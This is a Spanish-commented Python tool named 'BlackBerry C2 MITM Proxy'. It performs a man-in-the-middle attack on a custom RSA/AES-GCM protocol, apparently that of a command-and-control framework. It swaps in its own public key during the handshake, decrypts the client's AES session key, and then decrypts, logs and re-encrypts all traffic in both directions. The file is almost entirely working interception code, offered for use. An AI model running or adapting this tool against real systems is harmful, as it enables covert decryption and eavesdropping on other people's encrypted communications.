#!/usr/bin/env python3
import socket
import struct
import threading
import os
import zlib
import time
import uuid
import sys
from datetime import datetime
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend
import binascii
from colores import startnc

# ==================== CONFIGURACIÓN POR DEFECTO ====================
DEFAULT_PROXY_HOST = "0.0.0.0"
DEFAULT_PROXY_PORT = 9948
DEFAULT_SERVER_HOST = "localhost"
DEFAULT_SERVER_PORT = 9949
DEFAULT_OUTPUT_FILE = None
DEFAULT_SHOW_HEARTBEATS = True
DEFAULT_TERMINAL_LIMIT = 500

# Configuración actual (se modifica con argumentos)
CONFIG = {
    'proxy_host': DEFAULT_PROXY_HOST,
    'proxy_port': DEFAULT_PROXY_PORT,
    'server_host': DEFAULT_SERVER_HOST,
    'server_port': DEFAULT_SERVER_PORT,
    'output_file': DEFAULT_OUTPUT_FILE,
    'show_heartbeats': DEFAULT_SHOW_HEARTBEATS,
    'terminal_limit': DEFAULT_TERMINAL_LIMIT
}

# Límites
PUBKEY_READ_LIMIT = 8192
MAX_OUTPUT_SIZE = 1024 * 1024 * 100
RECV_TIMEOUT = 5  # Timeout corto para no bloquear
AES_KEY_BYTES = 32

# Lock para escritura
output_file_lock = threading.Lock()

# Colores
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# ==================== CLASE DE SESIÓN ====================

class MITMSession:
    """Representa una sesión MITM entre cliente y servidor."""
    
    def __init__(self, session_id, client_sock, client_addr, server_sock, server_addr):
        self.session_id = session_id
        self.uuid = str(uuid.uuid4())[:8]
        
        self.client_sock = client_sock
        self.client_addr = client_addr
        self.server_sock = server_sock
        self.server_addr = server_addr
        
        self.client_aes_key = None
        self.server_aes_key = None
        
        self.created_at = time.time()
        
        self.client_to_server_count = 0
        self.server_to_client_count = 0
        self.client_to_server_bytes = 0
        self.server_to_client_bytes = 0
        
        self.is_alive = True
        self.lock = threading.Lock()
        self.last_activity = time.time()
    
    def update_activity(self):
        """Actualiza timestamp de última actividad."""
        self.last_activity = time.time()
    
    def get_uptime(self):
        """Retorna el tiempo de vida de la sesión."""
        return time.time() - self.created_at
    
    def get_stats(self):
        """Retorna estadísticas de la sesión."""
        return {
            'session_id': self.session_id,
            'uuid': self.uuid,
            'client_addr': f"{self.client_addr[0]}:{self.client_addr[1]}",
            'server_addr': f"{self.server_addr[0]}:{self.server_addr[1]}",
            'uptime': f"{int(self.get_uptime())}s",
            'client_to_server_messages': self.client_to_server_count,
            'server_to_client_messages': self.server_to_client_count,
            'client_to_server_bytes': self.client_to_server_bytes,
            'server_to_client_bytes': self.server_to_client_bytes,
            'is_alive': self.is_alive
        }

# ==================== GESTOR DE SESIONES ====================

class SessionManager:
    """Gestiona múltiples sesiones MITM simultáneas."""
    
    def __init__(self):
        self.sessions = {}
        self.session_counter = 0
        self.lock = threading.Lock()
        self.total_sessions = 0
        self.active_sessions = 0
    
    def add_session(self, session):
        """Agrega una nueva sesión."""
        with self.lock:
            self.session_counter += 1
            session.session_id = self.session_counter
            self.sessions[self.session_counter] = session
            self.total_sessions += 1
            self.active_sessions += 1
            return self.session_counter
    
    def remove_session(self, session_id):
        """Elimina una sesión."""
        with self.lock:
            if session_id in self.sessions:
                del self.sessions[session_id]
                self.active_sessions -= 1
    
    def get_all_sessions(self):
        """Retorna todas las sesiones activas."""
        with self.lock:
            return list(self.sessions.values())
    
    def get_stats(self):
        """Retorna estadísticas globales."""
        with self.lock:
            return {
                'total_sessions_created': self.total_sessions,
                'active_sessions': self.active_sessions,
                'session_ids': list(self.sessions.keys())
            }

# Gestor global
session_manager = SessionManager()

# ==================== FUNCIONES AUXILIARES ====================

def print_banner():
    """Imprime el banner del proxy."""
    banner = f"""
{Colors.RED}{Colors.BOLD}
 ____    ___                    ____                                      
/\  _`\ /\_ \                  /\  _`\                                    
\ \ \L\ \//\ \      __      ___\ \ \L\ \     __   _ __   _ __   __  __    
 \ \  _ <'\ \ \   /'__`\   /'___\ \  _ <'  /'__`\/\`'__\/\`'__\/\ \/\ \   
  \ \ \L\ \\_\ \_/\ \L\.\_/\ \__/\ \ \L\ \/\  __/\ \ \/ \ \ \/ \ \ \_\ \  
   \ \____//\____\ \__/.\_\ \____\\ \____/\ \____\\ \_\  \ \_\  \/`____ \ 
    \/___/ \/____/\/__/\/_/\/____/ \/___/  \/____/ \/_/   \/_/   `/___/> \
                                                                    /\___/
                                                                    \/__/ 
         ______  ______                                                   
 /'\_/`\/\__  _\/\__  _\/'\_/`\                                           
/\      \/_/\ \/\/_/\ \/\      \                                          
\ \ \__\ \ \ \ \   \ \ \ \ \__\ \                                         
 \ \ \_/\ \ \_\ \__ \ \ \ \ \_/\ \                                        
  \ \_\\ \_\/\_____\ \ \_\ \_\\ \_\                                       
   \/_/ \/_/\/_____/  \/_/\/_/ \/_/     
{Colors.ENDC}
    """
    print(banner)

def get_timestamp():
    """Retorna timestamp formateado."""
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]

def print_section(title, color=Colors.CYAN):
    """Imprime una sección separadora."""
    print(f"\n{color}{'='*80}")
    print(f"  {title}")
    print(f"{'='*80}{Colors.ENDC}\n")

def recvall(sock, n, timeout=5):
    """
    Recibe exactamente n bytes del socket.
    Retorna None si hay error o timeout, pero NO cierra el socket.
    """
    data = b''
    sock.settimeout(timeout)
    end_time = time.time() + timeout
    
    while len(data) < n:
        time_left = end_time - time.time()
        if time_left <= 0:
            return None
        
        try:
            packet = sock.recv(n - len(data))
            if not packet:
                # Socket cerrado por el otro lado
                return None
            data += packet
        except socket.timeout:
            # Timeout esperando datos - NO es un error fatal
            return None
        except Exception:
            # Error real - conexión perdida
            return None
    
    return data

# ==================== GENERACIÓN DE CLAVES ====================

def generate_mitm_keys():
    """Genera par de claves RSA para el proxy."""
    
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    
    public_key = private_key.public_key()
    public_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    
    fingerprint = hashes.Hash(hashes.SHA256(), backend=default_backend())
    fingerprint.update(public_pem)
    fp_digest = fingerprint.finalize()
    fp_hex = binascii.hexlify(fp_digest).decode('utf-8')
    fp_formatted = ':'.join([fp_hex[i:i+2] for i in range(0, len(fp_hex), 2)])
    
    print(f"{Colors.GREEN}{startnc} Claves RSA generadas")
    print(f"{startnc} Fingerprint del proxy: {Colors.BOLD}{fp_formatted}{Colors.ENDC}\n")
    
    return private_key, public_pem, fp_formatted

# ==================== FUNCIONES DE CIFRADO ====================

def decrypt_message(data, aes_key):
    """Descifra un mensaje AES-GCM."""
    try:
        if len(data) < 13:
            return None, None
        
        flag = data[0]
        nonce = data[1:13]
        ciphertext = data[13:]
        
        aesgcm = AESGCM(aes_key)
        plaintext_bytes = aesgcm.decrypt(nonce, ciphertext, None)
        
        if flag == 1:
            plaintext_bytes = zlib.decompress(plaintext_bytes)
        
        plaintext_str = plaintext_bytes.decode('utf-8', 'replace')
        return plaintext_bytes, plaintext_str
    except Exception:
        return None, None

def encrypt_message(plaintext_bytes, aes_key):
    """Cifra un mensaje con AES-GCM."""
    try:
        flag = 0
        payload = plaintext_bytes
        
        if len(plaintext_bytes) > 100:
            try:
                compressed = zlib.compress(plaintext_bytes, level=9)
                if len(compressed) < len(plaintext_bytes):
                    payload = compressed
                    flag = 1
            except:
                pass
        
        aesgcm = AESGCM(aes_key)
        nonce = os.urandom(12)
        ciphertext = aesgcm.encrypt(nonce, payload, None)
        
        message = bytes([flag]) + nonce + ciphertext
        full_packet = struct.pack('!I', len(message)) + message
        
        return full_packet
    except Exception:
        return None

# ==================== OUTPUT Y LOGGING ====================

def write_to_output_file(content):
    """Escribe contenido al archivo de output si está configurado."""
    if CONFIG['output_file']:
        with output_file_lock:
            try:
                with open(CONFIG['output_file'], 'a', encoding='utf-8') as f:
                    f.write(content)
                    f.flush()
            except Exception as e:
                print(f"{Colors.RED}[!] Error escribiendo a output: {e}{Colors.ENDC}")

def log_intercepted_message(session, direction, plaintext_str, size):
    """Registra un mensaje interceptado."""
    timestamp = get_timestamp()
    
    # Determinar dirección
    if direction == "CLIENT_TO_SERVER":
        color = Colors.CYAN
        arrow = "→"
        label = "CLIENT → SERVER"
    else:
        color = Colors.GREEN
        arrow = "←"
        label = "SERVER → CLIENT"
    
    # Filtrar heartbeats si está configurado
    is_heartbeat = plaintext_str in ["HEARTBEAT", "HEARTBEAT_ACK"]
    if is_heartbeat and not CONFIG['show_heartbeats']:
        return
    
    # ==================== OUTPUT PARA ARCHIVO (COMPLETO) ====================
    if CONFIG['output_file']:
        file_content = f"""
{'='*80}
[{timestamp}] Session #{session.session_id} (UUID: {session.uuid})
{arrow} {label}
Client IP: {session.client_addr[0]}:{session.client_addr[1]}
Server IP: {session.server_addr[0]}:{session.server_addr[1]}
Size: {size} bytes
{'─'*80}
Content:
{plaintext_str}
{'='*80}

"""
        write_to_output_file(file_content)
    
    # ==================== OUTPUT PARA TERMINAL (TRUNCADO) ====================
    if is_heartbeat:
        content_display = f"{Colors.YELLOW}HEARTBEAT{Colors.ENDC}"
    else:
        if len(plaintext_str) > CONFIG['terminal_limit']:
            content_display = plaintext_str[:CONFIG['terminal_limit']] + f"... ({len(plaintext_str)} total chars)"
        else:
            content_display = plaintext_str
    
    # Mostrar en terminal con IPs claramente
    print(f"\n{color}┌─ [{timestamp}] Session #{session.session_id} (UUID: {session.uuid})")
    print(f"│  {arrow} {label}")
    print(f"│  Client IP: {Colors.BOLD}{session.client_addr[0]}:{session.client_addr[1]}{Colors.ENDC}")
    print(f"│  Server IP: {Colors.BOLD}{session.server_addr[0]}:{session.server_addr[1]}{Colors.ENDC}")
    print(f"│  Size: {size} bytes")
    
    if not is_heartbeat:
        print(f"│  Content:")
        for line in content_display.split('\n')[:20]:  # Máximo 20 líneas en terminal
            print(f"│    {line}")
    else:
        print(f"│  Type: {content_display}")
    
    print(f"{color}└{'─'*78}{Colors.ENDC}")

# ==================== ESTADÍSTICAS ====================

def stats_display_thread():
    """Thread que muestra estadísticas periódicamente."""
    while True:
        time.sleep(60)
        
        sessions = session_manager.get_all_sessions()
        if not sessions:
            continue
        
        print_section("ESTADÍSTICAS DE SESIONES ACTIVAS", Colors.BLUE)
        
        global_stats = session_manager.get_stats()
        stats_text = f"{Colors.BOLD}Global Stats:{Colors.ENDC}\n"
        stats_text += f"  Total sessions created: {global_stats['total_sessions_created']}\n"
        stats_text += f"  Active sessions: {global_stats['active_sessions']}\n\n"
        
        print(stats_text)
        
        if CONFIG['output_file']:
            write_to_output_file(f"\n{'='*80}\n")
            write_to_output_file(f"ESTADÍSTICAS [{datetime.now().isoformat()}]\n")
            write_to_output_file(f"{'='*80}\n")
            write_to_output_file(stats_text)
        
        print(f"{Colors.BOLD}Active Sessions:{Colors.ENDC}")
        for session in sessions:
            stats = session.get_stats()
            session_info = f"\n  Session #{stats['session_id']} (UUID: {stats['uuid']})\n"
            session_info += f"    Client: {stats['client_addr']}\n"
            session_info += f"    Server: {stats['server_addr']}\n"
            session_info += f"    Uptime: {stats['uptime']}\n"
            session_info += f"    Messages C→S: {stats['client_to_server_messages']} ({stats['client_to_server_bytes']} bytes)\n"
            session_info += f"    Messages S→C: {stats['server_to_client_messages']} ({stats['server_to_client_bytes']} bytes)\n"
            
            print(session_info)
            
            if CONFIG['output_file']:
                write_to_output_file(session_info)
        
        print()

# ==================== ESTABLECIMIENTO DE CONEXIÓN ====================

def establish_mitm_session(client_sock, client_addr, mitm_private_key, mitm_public_pem):
    """Establece una sesión MITM completa."""
    server_sock = None
    session = None
    
    try:
        # Conectar al servidor real
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.settimeout(15)
        server_sock.connect((CONFIG['server_host'], CONFIG['server_port']))
        
        # Recibir banner del servidor
        server_banner = server_sock.recv(1024)
        client_sock.sendall(server_banner)
        
        # Recibir REQUEST_PUBKEY del cliente
        client_request = client_sock.recv(1024)
        request_str = client_request.decode('utf-8', 'ignore').strip()
        
        if request_str != "REQUEST_PUBKEY":
            return None
        
        # Solicitar clave del servidor real
        server_sock.sendall(b"REQUEST_PUBKEY")
        real_server_pubkey = server_sock.recv(PUBKEY_READ_LIMIT)
        
        if not real_server_pubkey.startswith(b'PUBKEY:'):
            return None
        
        real_server_pubkey_pem = real_server_pubkey[len(b'PUBKEY:'):]
        
        # ¡ATAQUE! Enviar nuestra clave al cliente
        client_sock.sendall(b"PUBKEY:" + mitm_public_pem)
        
        # Recibir clave AES del cliente
        raw_len = recvall(client_sock, 4, 15)
        if not raw_len:
            return None
        
        key_len = struct.unpack('!I', raw_len)[0]
        encrypted_aes_from_client = recvall(client_sock, key_len, 15)
        if not encrypted_aes_from_client:
            return None
        
        # Descifrar clave AES del cliente
        client_aes_key = mitm_private_key.decrypt(
            encrypted_aes_from_client,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        
        # Generar clave AES para el servidor
        server_aes_key = os.urandom(AES_KEY_BYTES)
        
        # Cifrar con clave del servidor real
        real_server_public_key = serialization.load_pem_public_key(
            real_server_pubkey_pem,
            backend=default_backend()
        )
        
        encrypted_aes_to_server = real_server_public_key.encrypt(
            server_aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        
        server_sock.sendall(struct.pack('!I', len(encrypted_aes_to_server)) + encrypted_aes_to_server)
        
        # Crear sesión
        session = MITMSession(
            0,
            client_sock,
            client_addr,
            server_sock,
            (CONFIG['server_host'], CONFIG['server_port'])
        )
        
        session.client_aes_key = client_aes_key
        session.server_aes_key = server_aes_key
        
        # Registrar en el manager
        session_id = session_manager.add_session(session)
        
        # Mostrar información de la sesión con IPs claramente
        session_info = f"""
{'='*80}
  NUEVA SESIÓN MITM ESTABLECIDA
{'='*80}
Session #{session.session_id} (UUID: {session.uuid})
Cliente IP: {Colors.BOLD}{client_addr[0]}:{client_addr[1]}{Colors.ENDC}
Servidor IP: {Colors.BOLD}{CONFIG['server_host']}:{CONFIG['server_port']}{Colors.ENDC}
Clave AES del cliente: {binascii.hexlify(client_aes_key[:8]).decode()}...
Status: Conexión VIVA hasta que cliente o servidor desconecten
{'='*80}

"""
        
        print(f"\n{Colors.GREEN}{session_info}{Colors.ENDC}")
        
        if CONFIG['output_file']:
            write_to_output_file(session_info)
        
        return session
    
    except Exception as e:
        print(f"{Colors.RED}[!] Error estableciendo sesión: {e}{Colors.ENDC}")
        if server_sock:
            try:
                server_sock.close()
            except:
                pass
        return None

# ==================== REENVÍO DE TRÁFICO ====================

def forward_client_to_server(session):
    """
    Reenvía tráfico del cliente al servidor INDEFINIDAMENTE.
    CORREGIDO: No cierra por timeout, solo por desconexión real.
    """
    consecutive_timeouts = 0
    MAX_CONSECUTIVE_TIMEOUTS = 60  # 60 timeouts de 5s = 5 minutos sin datos antes de considerar muerto
    
    while session.is_alive:
        try:
            # Recibir del cliente con timeout corto
            raw_len = recvall(session.client_sock, 4, RECV_TIMEOUT)
            
            if raw_len is None:
                # Timeout o error temporal - NO cerrar, solo continuar esperando
                consecutive_timeouts += 1
                if consecutive_timeouts > MAX_CONSECUTIVE_TIMEOUTS:
                    # Mucho tiempo sin datos - posible conexión muerta
                    break
                time.sleep(0.1)  # Pequeña pausa para no consumir CPU
                continue
            
            # Tenemos datos - resetear contador
            consecutive_timeouts = 0
            
            msg_len = struct.unpack('!I', raw_len)[0]
            if msg_len > MAX_OUTPUT_SIZE:
                break
            
            encrypted_data = recvall(session.client_sock, msg_len, max(15, msg_len / 10000))
            if not encrypted_data:
                # Error real recibiendo datos
                break
            
            # Descifrar
            plaintext_bytes, plaintext_str = decrypt_message(encrypted_data, session.client_aes_key)
            
            if plaintext_bytes is None:
                continue
            
            # Actualizar actividad y estadísticas
            session.update_activity()
            with session.lock:
                session.client_to_server_count += 1
                session.client_to_server_bytes += len(plaintext_bytes)
            
            # Registrar mensaje interceptado
            log_intercepted_message(session, "CLIENT_TO_SERVER", plaintext_str, len(plaintext_bytes))
            
            # Re-cifrar y enviar al servidor (totalmente transparente)
            re_encrypted = encrypt_message(plaintext_bytes, session.server_aes_key)
            if re_encrypted:
                session.server_sock.sendall(re_encrypted)
        
        except Exception as e:
            # Error fatal
            break
    
    session.is_alive = False

def forward_server_to_client(session):
    """
    Reenvía tráfico del servidor al cliente INDEFINIDAMENTE.
    CORREGIDO: No cierra por timeout, solo por desconexión real.
    """
    consecutive_timeouts = 0
    MAX_CONSECUTIVE_TIMEOUTS = 60  # 60 timeouts de 5s = 5 minutos sin datos
    
    while session.is_alive:
        try:
            # Recibir del servidor con timeout corto
            raw_len = recvall(session.server_sock, 4, RECV_TIMEOUT)
            
            if raw_len is None:
                # Timeout o error temporal - NO cerrar, solo continuar esperando
                consecutive_timeouts += 1
                if consecutive_timeouts > MAX_CONSECUTIVE_TIMEOUTS:
                    # Mucho tiempo sin datos - posible conexión muerta
                    break
                time.sleep(0.1)
                continue
            
            # Tenemos datos - resetear contador
            consecutive_timeouts = 0
            
            msg_len = struct.unpack('!I', raw_len)[0]
            if msg_len > MAX_OUTPUT_SIZE:
                break
            
            encrypted_data = recvall(session.server_sock, msg_len, max(15, msg_len / 10000))
            if not encrypted_data:
                # Error real
                break
            
            # Descifrar
            plaintext_bytes, plaintext_str = decrypt_message(encrypted_data, session.server_aes_key)
            
            if plaintext_bytes is None:
                continue
            
            # Actualizar actividad y estadísticas
            session.update_activity()
            with session.lock:
                session.server_to_client_count += 1
                session.server_to_client_bytes += len(plaintext_bytes)
            
            # Registrar mensaje interceptado
            log_intercepted_message(session, "SERVER_TO_CLIENT", plaintext_str, len(plaintext_bytes))
            
            # Re-cifrar y enviar al cliente (totalmente transparente)
            re_encrypted = encrypt_message(plaintext_bytes, session.client_aes_key)
            if re_encrypted:
                session.client_sock.sendall(re_encrypted)
        
        except Exception:
            # Error fatal
            break
    
    session.is_alive = False

# ==================== MANEJO DE CLIENTE ====================

def handle_client_connection(client_sock, client_addr, mitm_private_key, mitm_public_pem):
    """Maneja una conexión de cliente completa."""
    session = None
    
    try:
        # Establecer sesión MITM
        session = establish_mitm_session(client_sock, client_addr, mitm_private_key, mitm_public_pem)
        
        if not session:
            return
        
        # Iniciar threads de reenvío (mantienen conexión viva indefinidamente)
        t1 = threading.Thread(
            target=forward_client_to_server,
            args=(session,),
            daemon=True
        )
        
        t2 = threading.Thread(
            target=forward_server_to_client,
            args=(session,),
            daemon=True
        )
        
        t1.start()
        t2.start()
        
        # Esperar a que terminen (solo cuando hay desconexión real)
        t1.join()
        t2.join()
    
    except Exception as e:
        print(f"{Colors.RED}[!] Error en manejo de cliente: {e}{Colors.ENDC}")
    
    finally:
        if session:
            # Mostrar resumen final
            final_summary = f"""
{'='*80}
  SESIÓN FINALIZADA
{'='*80}
Session #{session.session_id} (UUID: {session.uuid})
Cliente IP: {session.client_addr[0]}:{session.client_addr[1]}
Servidor IP: {session.server_addr[0]}:{session.server_addr[1]}
Duración: {int(session.get_uptime())}s
Razón: Cliente o servidor desconectado
Mensajes interceptados: C→S: {session.client_to_server_count}, S→C: {session.server_to_client_count}
Bytes interceptados: C→S: {session.client_to_server_bytes}, S→C: {session.server_to_client_bytes}
{'='*80}

"""
            
            print(f"{Colors.YELLOW}{final_summary}{Colors.ENDC}")
            
            if CONFIG['output_file']:
                write_to_output_file(final_summary)
            
            # Cerrar conexiones
            try:
                session.client_sock.close()
            except:
                pass
            try:
                session.server_sock.close()
            except:
                pass
            
            # Remover del manager
            session_manager.remove_session(session.session_id)

# ==================== PARSING DE ARGUMENTOS ROBUSTO ====================

def parse_arguments_robust(args):
    """
    Parsea argumentos de forma robusta, aceptando cualquier orden y variaciones.
    
    Formatos soportados:
    --proxy-host HOST / -ph HOST / --ph HOST / -proxy-host HOST
    --proxy-port PORT / -pp PORT / --pp PORT / -proxy-port PORT
    --server-host HOST / -sh HOST / --sh HOST / -server-host HOST
    --server-port PORT / -sp PORT / --sp PORT / -server-port PORT
    --output FILE / -o FILE / -O FILE
    --show-heartbeats / -hb / --hb
    --terminal-limit N / -tl N / --tl N
    --help / -h
    """
    
    # Normalizar argumentos a minúsculas para comparación
    i = 0
    while i < len(args):
        arg = args[i].lower()
        
        # Proxy Host
        if arg in ['--proxy-host', '-ph', '--ph', '-proxy-host', '--proxyhost', '-proxyhost']:
            if i + 1 < len(args):
                CONFIG['proxy_host'] = args[i + 1]
                i += 2
                continue
        
        # Proxy Port
        elif arg in ['--proxy-port', '-pp', '--pp', '-proxy-port', '--proxyport', '-proxyport']:
            if i + 1 < len(args):
                try:
                    CONFIG['proxy_port'] = int(args[i + 1])
                except ValueError:
                    print(f"{Colors.RED}[!] Puerto del proxy inválido: {args[i + 1]}{Colors.ENDC}")
                i += 2
                continue
        
        # Server Host
        elif arg in ['--server-host', '-sh', '--sh', '-server-host', '--serverhost', '-serverhost']:
            if i + 1 < len(args):
                CONFIG['server_host'] = args[i + 1]
                i += 2
                continue
        
        # Server Port
        elif arg in ['--server-port', '-sp', '--sp', '-server-port', '--serverport', '-serverport']:
            if i + 1 < len(args):
                try:
                    CONFIG['server_port'] = int(args[i + 1])
                except ValueError:
                    print(f"{Colors.RED}[!] Puerto del servidor inválido: {args[i + 1]}{Colors.ENDC}")
                i += 2
                continue
        
        # Output File
        elif arg in ['--output', '-o', '-O', '--o', '--output-file', '-output']:
            if i + 1 < len(args):
                CONFIG['output_file'] = args[i + 1]
                i += 2
                continue
        
        # Show Heartbeats
        elif arg in ['--show-heartbeats', '-hb', '--hb', '--heartbeats', '-heartbeats', '--show-hb']:
            CONFIG['show_heartbeats'] = True
            i += 1
            continue
        
        # Terminal Limit
        elif arg in ['--terminal-limit', '-tl', '--tl', '--limit', '-limit']:
            if i + 1 < len(args):
                try:
                    CONFIG['terminal_limit'] = int(args[i + 1])
                except ValueError:
                    print(f"{Colors.RED}[!] Límite terminal inválido: {args[i + 1]}{Colors.ENDC}")
                i += 2
                continue
        
        # Help
        elif arg in ['--help', '-h', '--h', '-help', 'help']:
            show_help()
            sys.exit(0)
        
        else:
            # Argumento desconocido - intentar interpretarlo
            print(f"{Colors.YELLOW}[!] Argumento desconocido ignorado: {args[i]}{Colors.ENDC}")
            i += 1

def show_help():
    """Muestra ayuda de uso."""
    help_text = f"""
{Colors.BOLD}BlackBerry C2 MITM Proxy - Ayuda{Colors.ENDC}

{Colors.CYAN}Uso:{Colors.ENDC}
  python3 {sys.argv[0]} [opciones]

{Colors.CYAN}Opciones:{Colors.ENDC}
  {Colors.BOLD}Configuración del Proxy:{Colors.ENDC}
    --proxy-host HOST, -ph HOST      Host donde escucha el proxy (default: 0.0.0.0)
    --proxy-port PORT, -pp PORT      Puerto del proxy (default: 9948)
    
  {Colors.BOLD}Configuración del Servidor Real:{Colors.ENDC}
    --server-host HOST, -sh HOST     Host del servidor real (default: localhost)
    --server-port PORT, -sp PORT     Puerto del servidor real (default: 9949)
    
  {Colors.BOLD}Output y Logging:{Colors.ENDC}
    --output FILE, -O FILE           Guardar output completo en archivo
    --show-heartbeats, -hb           Mostrar mensajes de heartbeat
    --terminal-limit N, -tl N        Límite de caracteres en terminal (default: 500)
    
  {Colors.BOLD}Ayuda:{Colors.ENDC}
    --help, -h                       Mostrar esta ayuda

{Colors.CYAN}Ejemplos:{Colors.ENDC}
  {Colors.YELLOW}# Configuración básica{Colors.ENDC}
  python3 {sys.argv[0]}
  
  {Colors.YELLOW}# Con output completo en archivo{Colors.ENDC}
  python3 {sys.argv[0]} -O output.txt
  
  {Colors.YELLOW}# Proxy en puerto 8080, servidor en 192.168.1.100:9949{Colors.ENDC}
  python3 {sys.argv[0]} -pp 8080 -sh 192.168.1.100 -sp 9949
  
  {Colors.YELLOW}# Con heartbeats y límite de 1000 chars en terminal{Colors.ENDC}
  python3 {sys.argv[0]} -O log.txt -hb -tl 1000
  
  {Colors.YELLOW}# Argumentos en cualquier orden (robusto){Colors.ENDC}
  python3 {sys.argv[0]} -O output.txt -sh 10.0.0.1 -pp 9000 -sp 8888 -hb

{Colors.CYAN}Notas:{Colors.ENDC}
  • Los argumentos pueden estar en cualquier orden
  • Soporta múltiples variaciones: --proxy-port, -pp, --pp, etc.
  • Las conexiones permanecen VIVAS indefinidamente
  • Output en terminal: truncado para legibilidad
  • Output en archivo (-O): COMPLETO sin truncar
"""
    print(help_text)

# ==================== SERVIDOR PRINCIPAL ====================

def start_mitm_proxy():
    """Inicia el servidor proxy MITM."""
    
    # Configurar output file si se especificó
    if CONFIG['output_file']:
        try:
            with open(CONFIG['output_file'], 'w', encoding='utf-8') as f:
                f.write(f"BlackBerry C2 MITM Proxy - Output Log\n")
                f.write(f"Inicio: {datetime.now().isoformat()}\n")
                f.write(f"{'='*80}\n\n")
            print(f"{Colors.GREEN}{startnc} Output completo se guardará en: {CONFIG['output_file']}{Colors.ENDC}\n")
        except Exception as e:
            print(f"{Colors.RED}[!] Error creando archivo de output: {e}{Colors.ENDC}")
            CONFIG['output_file'] = None
    
    print_banner()
    
    # Generar claves
    mitm_private_key, mitm_public_pem, mitm_fingerprint = generate_mitm_keys()
    
    # Configuración
    print_section(f"CONFIGURACIÓN DEL PROXY", Colors.BLUE)
    print(f"{Colors.CYAN}Proxy escuchando en:{Colors.ENDC} {Colors.BOLD}{CONFIG['proxy_host']}:{CONFIG['proxy_port']}{Colors.ENDC}")
    print(f"{Colors.CYAN}Servidor real:{Colors.ENDC} {Colors.BOLD}{CONFIG['server_host']}:{CONFIG['server_port']}{Colors.ENDC}")
    print(f"{Colors.CYAN}Mostrar heartbeats:{Colors.ENDC} {CONFIG['show_heartbeats']}")
    print(f"{Colors.CYAN}Output file:{Colors.ENDC} {CONFIG['output_file'] if CONFIG['output_file'] else 'No (solo terminal)'}")
    print(f"{Colors.CYAN}Truncamiento terminal:{Colors.ENDC} {CONFIG['terminal_limit']} chars")

    # Iniciar thread de estadísticas
    stats_thread = threading.Thread(target=stats_display_thread, daemon=True)
    stats_thread.start()
    
    # Crear socket
    try:
        proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        proxy_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        proxy_sock.bind((CONFIG['proxy_host'], CONFIG['proxy_port']))
        proxy_sock.listen(10)
    except Exception as e:
        print(f"{Colors.RED}[!] Error iniciando proxy: {e}{Colors.ENDC}")
        print(f"{Colors.YELLOW}[i] Verifica que el puerto {CONFIG['proxy_port']} no esté en uso{Colors.ENDC}\n")
        return
    
    print_section("PROXY ACTIVO", Colors.GREEN)
    try:
        while True:
            client_sock, client_addr = proxy_sock.accept()
            
            print(f"{Colors.CYAN}[+] Nueva conexión entrante de {Colors.BOLD}{client_addr[0]}:{client_addr[1]}{Colors.ENDC}")
            
            if CONFIG['output_file']:
                write_to_output_file(f"\n[+] Nueva conexión: {client_addr[0]}:{client_addr[1]} [{datetime.now().isoformat()}]\n")
            
            # Crear thread para manejar cliente
            threading.Thread(
                target=handle_client_connection,
                args=(client_sock, client_addr, mitm_private_key, mitm_public_pem),
                daemon=True
            ).start()
    
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}{'='*80}")
        print(f"  PROXY DETENIDO POR USUARIO")
        print(f"{'='*80}{Colors.ENDC}\n")
        
        # Mostrar estadísticas finales
        stats = session_manager.get_stats()
        final_stats = f"""
Estadísticas Finales:
  Total de sesiones creadas: {stats['total_sessions_created']}
  Sesiones activas al cerrar: {stats['active_sessions']}
"""
        print(final_stats)
        
        if CONFIG['output_file']:
            write_to_output_file(f"\n{'='*80}\n")
            write_to_output_file(f"PROXY DETENIDO [{datetime.now().isoformat()}]\n")
            write_to_output_file(final_stats)
            write_to_output_file(f"{'='*80}\n")
            print(f"\n{Colors.GREEN}{startnc} Output completo guardado en: {CONFIG['output_file']}{Colors.ENDC}\n")
    
    finally:
        proxy_sock.close()

# ==================== MAIN ====================

def main():
    """Función principal."""
    
    # Parsear argumentos de forma robusta
    if len(sys.argv) > 1:
        parse_arguments_robust(sys.argv[1:])
    
    try:
        start_mitm_proxy()
    except Exception as e:
        print(f"{Colors.RED}[!] Error fatal: {e}{Colors.ENDC}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()